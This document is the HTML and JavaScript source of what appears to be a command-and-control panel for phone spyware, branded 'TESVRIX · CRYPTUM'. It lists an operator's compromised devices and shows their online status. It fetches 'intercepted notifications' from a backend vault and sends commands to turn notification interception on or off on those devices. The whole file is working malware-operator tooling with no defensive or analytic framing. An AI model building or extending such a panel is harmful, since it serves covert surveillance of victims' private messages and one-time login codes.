<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow">
    <title>TESVRIX · CRYPTUM | NOTIFICATION INTELLIGENCE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-dark: #be123c;
            --primary-glow: rgba(225, 29, 72, 0.5);
            --accent-cyan: #06b6d4;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --bg-void: #020617;
            --bg-surface: #0f172a;
            --bg-elevated: #1e293b;
            --glass-border: rgba(225, 29, 72, 0.25);
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --transition-smooth: 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
        }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }

        body {
            background: radial-gradient(ellipse at 15% 30%, #0a0f1f, var(--bg-void));
            font-family: 'Inter', sans-serif;
            padding: 20px;
            min-height: 100vh;
            color: var(--text-primary);
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: ""; position: fixed; inset: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.05) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
            z-index: 999; background-size: 100% 2px, 3px 100%; pointer-events: none;
        }

        .app-container { max-width: 1300px; margin: 0 auto; width: 100%; position: relative; z-index: 2; }

        /* HEADER BAR */
        .command-bar {
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 1.2rem 2rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 20px;
            flex-wrap: wrap;
            box-shadow: 0 10px 40px -10px rgba(0,0,0,0.6);
        }

        .brand-badge { display: flex; align-items: center; gap: 15px; }
        .brand-badge i { font-size: 1.8rem; color: var(--primary); filter: drop-shadow(0 0 8px var(--primary-glow)); }

        .status-core {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(0,0,0,0.4);
            padding: 6px 18px;
            border-radius: 40px;
            border: 1px solid rgba(255,255,255,0.08);
        }

        .live-dot { width: 10px; height: 10px; border-radius: 50%; background: #64748b; transition: all 0.3s; }
        .live-dot.active { background: var(--accent-green); box-shadow: 0 0 10px var(--accent-green); animation: pulseDot 2s infinite; }
        @keyframes pulseDot { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.6; } }

        .device-selector {
            background: rgba(2, 6, 23, 0.9);
            border: 1px solid rgba(225, 29, 72, 0.3);
            border-radius: 12px;
            padding: 12px 20px;
            font-family: 'Space Grotesk', monospace;
            font-weight: 600;
            color: var(--text-primary);
            outline: none;
            cursor: pointer;
            font-size: 0.85rem;
            min-width: 280px;
            transition: var(--transition-smooth);
        }
        .device-selector:hover { border-color: var(--primary); box-shadow: 0 0 15px rgba(225, 29, 72, 0.2); }

        /* ACTIONS */
        .action-row { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 1.5rem; align-items: center; }
        .btn-tesvrix {
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 14px;
            padding: 12px 24px;
            font-weight: 700;
            font-size: 0.75rem;
            font-family: 'Space Grotesk', monospace;
            color: var(--text-primary);
            cursor: pointer;
            transition: var(--transition-smooth);
            display: inline-flex;
            align-items: center;
            gap: 12px;
            letter-spacing: 1px;
        }
        .btn-tesvrix:hover { background: var(--bg-elevated); transform: scale(1.02); border-color: var(--primary); }

        .search-field { flex: 1; position: relative; min-width: 250px; }
        .search-field i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: var(--primary); font-size: 0.9rem; }
        .search-field input {
            width: 100%;
            background: rgba(2, 6, 23, 0.8);
            border: 1px solid rgba(225, 29, 72, 0.2);
            border-radius: 14px;
            padding: 14px 20px 14px 48px;
            color: var(--text-primary);
            font-size: 0.85rem;
            outline: none;
            transition: var(--transition-smooth);
        }
        .search-field input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(225, 29, 72, 0.15); }

        /* FEED CONTAINER */
        .messages-container {
            position: relative;
            background: rgba(5, 8, 22, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            overflow: hidden;
            height: calc(100vh - 250px);
            min-height: 400px;
            box-shadow: inset 0 0 30px rgba(0,0,0,0.4);
        }

        .message-feed {
            height: 100%;
            overflow-y: auto;
            padding: 30px;
            display: flex;
            flex-direction: column;
            gap: 20px;
            scroll-behavior: smooth;
        }

        .msg-item {
            background: rgba(30, 41, 59, 0.5);
            border-radius: 20px;
            padding: 18px 25px;
            border: 1px solid rgba(255,255,255,0.03);
            max-width: 100%;
            animation: msgAppear 0.5s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
            position: relative;
            border-left: 5px solid var(--primary);
        }
        @keyframes msgAppear { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .msg-meta { display: flex; justify-content: space-between; font-size: 0.65rem; color: var(--text-secondary); margin-bottom: 12px; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.5px; }
        .msg-content { font-size: 0.9rem; line-height: 1.6; word-break: break-word; color: #e2e8f0; font-family: 'Inter', sans-serif; }

        /* LOADER */
        .loader-overlay {
            position: absolute; inset: 0;
            background: rgba(2, 6, 23, 0.95);
            backdrop-filter: blur(15px);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 100;
            border-radius: 28px;
        }
        .cyber-spinner {
            width: 60px; height: 60px;
            border: 4px solid rgba(225, 29, 72, 0.1);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
            filter: drop-shadow(0 0 10px var(--primary-glow));
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        @media (max-width: 992px) {
            .command-bar { padding: 1rem; }
            .messages-container { height: 75vh; }
            .msg-item { padding: 15px; }
        }
    </style>
</head>
<body>
<div class="app-container">
    <div class="command-bar">
        <div class="brand-badge">
            <i class="fas fa-bell"></i>
            <div class="status-core"><span class="live-dot" id="liveDot"></span><span id="liveStatusText" style="font-size: 0.7rem; font-weight: 800; letter-spacing: 1px; color: var(--text-secondary);">SEARCHING...</span></div>
        </div>
        <select id="deviceSelector" class="device-selector"></select>
    </div>

    <div class="action-row">
        <button id="btnRefresh" class="btn-tesvrix"><i class="fas fa-sync-alt"></i> REFRESH FEED</button>
        <button id="btnClean" class="btn-tesvrix" style="border-color:var(--accent-red); color:var(--accent-red);"><i class="fas fa-broom"></i> CLEAR LOGS</button>
        <div style="display: flex; align-items: center; gap: 10px; background: rgba(30, 41, 59, 0.8); padding: 8px 18px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.1);">
            <span style="font-size: 0.65rem; font-weight: 800; color: var(--text-secondary); letter-spacing: 1px;">INTERCEPTION:</span>
            <label class="switch" style="position: relative; display: inline-block; width: 40px; height: 20px;">
                <input type="checkbox" id="toggleInterception" checked style="opacity: 0; width: 0; height: 0;">
                <span class="slider" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #334155; transition: .4s; border-radius: 20px;"></span>
            </label>
        </div>
        <div class="search-field"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Search intercepted notifications..."></div>
    </div>
    <style>
        .switch input:checked + .slider { background-color: var(--primary); }
        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
        .switch input:checked + .slider:before { transform: translateX(20px); }
    </style>

    <div class="messages-container">
        <div class="loader-overlay" id="syncLoader">
            <div class="cyber-spinner"></div>
            <span style="font-size: 0.8rem; margin-top: 20px; letter-spacing: 2px; font-weight: 700; color: var(--primary);">SYNCING INTELLIGENCE</span>
        </div>
        <div class="message-feed" id="feed"><div style="text-align:center; padding: 120px; color: #475569;"><i class="fas fa-bell-slash fa-3x" style="margin-bottom: 20px; opacity: 0.5;"></i><br><span style="letter-spacing: 2px; font-weight: 600;">NO NOTIFICATIONS INTERCEPTED</span></div></div>
    </div>
</div>

<script src="../davidkewebsitekemake300kespeedma/config.php"></script>
<script>
    const auth = JSON.parse(localStorage.getItem('user') || '{}');
    let targetId = null, currentLogs = [];

    async function sb(path, method = 'GET', body = null) {
        
        try {
            const r = await fetch(getApiUrl(path), { method, headers: getApiHeaders(), body: body ? JSON.stringify(body) : null });
            return (method === 'DELETE' || r.status === 204) ? true : await r.json();
        } catch (e) { return null; }
    }

    async function syncDevices() {
        const data = await sb(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`);
        if (data) {
            const sel = document.getElementById('deviceSelector');
            sel.innerHTML = data.map(d => {
                const online = (new Date() - new Date(d.last_seen)) < 35000;
                return `<option value="${d.device_uuid}" ${d.device_uuid === targetId ? 'selected' : ''}>${online ? '●' : '○'} ${d.device_name || 'NODE'}</option>`;
            }).join('');
            if (!targetId && data[0]) { targetId = data[0].device_uuid; fetchLogs(); }

            const cur = data.find(d => d.device_uuid === targetId);
            if (cur) {
                const online = (new Date() - new Date(cur.last_seen)) < 35000;
                document.getElementById('liveDot').className = 'live-dot' + (online ? ' active' : '');
                document.getElementById('liveStatusText').innerText = online ? 'LINK SECURE' : 'UPLINK LOST';
                document.getElementById('liveStatusText').style.color = online ? 'var(--accent-green)' : 'var(--accent-red)';
            }
        }
    }

    async function fetchLogs() {
        if (!targetId) return;
        document.getElementById('syncLoader').style.display = 'flex';
        const logs = await sb(`vault?device_uuid=eq.${targetId}&type=eq.notifications&order=created_at.desc&limit=11`);
        if (logs) {
            if (logs.length > 10) {
                 // Auto-purge oldest 10-item limit logic
                const oldest = logs[logs.length - 1];
                await sb(`vault?id=eq.${oldest.id}`, 'DELETE');
                currentLogs = logs.slice(0, 10);
            } else {
                currentLogs = logs;
            }
            renderFeed();
        }
        document.getElementById('syncLoader').style.display = 'none';
    }

    document.getElementById('toggleInterception').onchange = async (e) => {
        if (!targetId) return;
        const enabled = e.target.checked;
        await sb('commands', 'POST', {
            device_uuid: targetId,
            type: '/notifications_toggle',
            data: JSON.stringify({enabled}),
            operator_id: auth.operator_id,
            status: 'pending'
        });
        alert(`INTERCEPTION ${enabled ? 'ENABLED' : 'DISABLED'} COMMAND SENT`);
    };

    function renderFeed() {
        const feed = document.getElementById('feed');
        const query = document.getElementById('searchInput').value.toLowerCase();
        let filtered = query ? currentLogs.filter(l => l.content.toLowerCase().includes(query)) : currentLogs;

        if (!filtered.length) {
            feed.innerHTML = '<div style="text-align:center; padding:120px; color:#475569;"><i class="fas fa-bell-slash fa-2x" style="margin-bottom:15px; opacity:0.3;"></i><br>NO DATA PACKETS FOUND</div>';
            return;
        }

        feed.innerHTML = filtered.map(l => `
            <div class="msg-item">
                <div class="msg-meta">
                    <span><i class="far fa-clock"></i> ${new Date(l.created_at).toLocaleString()}</span>
                    <span style="font-weight:800; color:var(--primary); opacity:0.7;">[NOTIFICATION]</span>
                </div>
                <div class="msg-content" style="white-space:pre-wrap;">${l.content}</div>
            </div>`).join('');
    }

    document.getElementById('btnRefresh').onclick = fetchLogs;
    document.getElementById('btnClean').onclick = async () => {
        if (confirm("Clear all notification logs for this device?")) {
            await sb(`vault?device_uuid=eq.${targetId}&type=eq.notifications`, 'DELETE');
            fetchLogs();
        }
    };
    document.getElementById('deviceSelector').onchange = (e) => { targetId = e.target.value; fetchLogs(); };
    document.getElementById('searchInput').oninput = renderFeed;

    syncDevices();
    setInterval(syncDevices, 10000);
    setInterval(fetchLogs, 5000);
</script>
</body>
</html>
